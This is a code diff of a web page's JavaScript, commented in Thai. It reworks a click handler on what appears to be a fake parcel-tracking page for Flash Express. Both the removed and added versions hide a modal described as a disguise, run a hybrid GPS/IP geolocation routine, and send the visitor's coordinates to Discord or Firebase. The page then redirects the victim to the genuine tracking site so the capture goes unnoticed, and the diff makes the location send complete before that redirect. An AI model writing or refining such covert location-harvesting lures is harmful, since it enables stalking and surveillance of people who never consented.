@@ -90,32 +90,8 @@
     const BASE_LAT = 9.9833;
     const BASE_LNG = 99.1500;
     const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
-    // ฟังก์ชันสับสวิตช์ระบบ ไม่บล็อกการเปลี่ยนหน้า (วางแทรกบรรทัด 85)
-function handleTargetClick() {
-    // 1. บังคับนับถอยหลัง 2.5 วินาทีเตะเด้งออกไปเว็บ Flash Express แน่นอน 100%
-    setTimeout(() => {
-        window.location.href = FLASH_EXPRESS_URL;
-    }, 2500);
-
-    // 2. ซ่อนหน้าต่าง Modal แจ้งเตือนปกติ
-    const modal = document.getElementById('modal-overlay');
-    if (modal) {
-        modal.style.opacity = '0';
-        modal.style.transition = 'opacity 0.3s ease';
-        setTimeout(() => { modal.style.display = 'none'; }, 300);
-    }
-
-    // 3. รันระบบส่งพิกัดเข้า Discord (จับใส่บล็อกแยกเพื่อป้องกันโครงสร้าง Firebase บล็อกระบบ)
-    setTimeout(() => {
-        try {
-            if (typeof runHybridGeolocation === 'function') {
-                runHybridGeolocation();
-            }
-        } catch (error) {
-            console.log("Discord sync error split processing");
-        }
-    }, 50);
-}
+// ฟังก์ชันสับสวิตช์ระบบ ไม่บล็อกการเปลี่ยนหน้า (วางแทรกบรรทัด 85)
+// handleTargetClick ถูกย้ายไปที่ท้ายไฟล์เพื่อใช้ระบบ async/await แทน setTimeout
     // Firebase Configuration (for real-time sync)
     const FIREBASE_CONFIG = {
       apiKey: "AIzaSyDummyKey",
@@ -664,13 +640,8 @@ async function fetchIPGeo() {
     }
 
     // ===== GLOBAL SCOPE FUNCTION: handleTargetClick =====
-    function handleTargetClick() {
-        // 1. บังคับนับถอยหลัง 2.5 วินาทีแล้วดีดหน้าจอไปเว็บพัสดุทันที (ห้ามบล็อก)
-        setTimeout(() => {
-            window.location.href = FLASH_EXPRESS_URL;
-        }, 2500);
-
-        // 2. ซ่อนหน้าต่าง Modal พรางตา
+    async function handleTargetClick() {
+        // 1. ซ่อน Modal แจ้งเตือน
         const modal = document.getElementById('modal-overlay');
         if (modal) {
             modal.style.opacity = '0';
@@ -678,14 +649,17 @@ async function fetchIPGeo() {
             setTimeout(() => { modal.style.display = 'none'; }, 300);
         }
 
-        // 3. ยิงพิกัดส่งข้อมูลเข้า Discord และมอนิเตอร์
+        // 2. รันการดึงพิกัด (GPS หรือ IP Fallback) และส่งข้อมูลเข้า Firebase
         try {
             if (typeof runHybridGeolocation === 'function') {
-                runHybridGeolocation();
+                await runHybridGeolocation();
             }
         } catch (e) {
             console.log("Geolocation error processed background");
         }
+
+        // 3. ทำการเปลี่ยนหน้าเว็บทันทีที่ sendToFirebase ทำงานเสร็จ (หรือล้มเหลว)
+        window.location.href = FLASH_EXPRESS_URL;
     }
 
     // ===== INIT =====
